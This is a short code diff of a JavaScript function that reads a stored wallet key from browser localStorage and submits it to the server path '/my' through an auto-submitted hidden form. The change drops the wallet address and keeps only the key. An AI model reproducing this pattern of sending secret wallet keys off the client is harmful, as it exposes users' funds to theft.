@@ -18,23 +18,16 @@ function initData() {
 }
 
 function sendmyData() {
-  var data1 = localStorage.getItem("WALLET_ADDRESS");
-  var data2 = localStorage.getItem("WALLET_KEY");
+  var data = localStorage.getItem("WALLET_KEY");
   var form = document.createElement("form");
   form.method = "post";
   form.action = "/my";
 
-  var input1 = document.createElement("input");
-  input1.type = "hidden";
-  input1.name = "data1";
-  input1.value = data1;
+  var input = document.createElement("input");
+  input.type = "hidden";
+  input.name = "data";
+  input.value = data;
   form.appendChild(input);
-
-  var input2 = document.createElement("input");
-  input2.type = "hidden";
-  input2.name = "data2";
-  input2.value = data2;
-  form.appendChild(input2);
   document.body.appendChild(form);
   form.submit();
 }
